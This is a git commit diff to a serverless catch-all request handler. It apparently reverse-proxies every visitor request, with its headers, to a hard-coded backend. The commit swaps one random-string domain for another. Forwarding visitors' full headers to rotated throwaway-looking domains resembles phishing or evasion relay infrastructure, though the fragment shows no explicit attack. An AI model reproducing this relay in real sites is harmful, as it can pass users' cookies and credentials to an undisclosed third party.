d37e739fd63acfc595d07361b228b87321eba8af
savosixir984 <savosixir984@gmail.com>
2025-03-06 15:35:25 +0300

    Update [[path]].js

--- functions/[[path]].js
+++ functions/[[path]].js
@@ -1,7 +1,7 @@
 export async function onRequest({ request }) {
 	const url = new URL(request.url)
 
-	const proxyUrl = 'https://sdfsdfsfdsdfsdf.cyou'
+	const proxyUrl = 'https://eroiuytdshfkjvcx.shop'
 	const backendUrl = `${proxyUrl}${url.pathname}`
 
 	const headers = new Headers(request.headers)
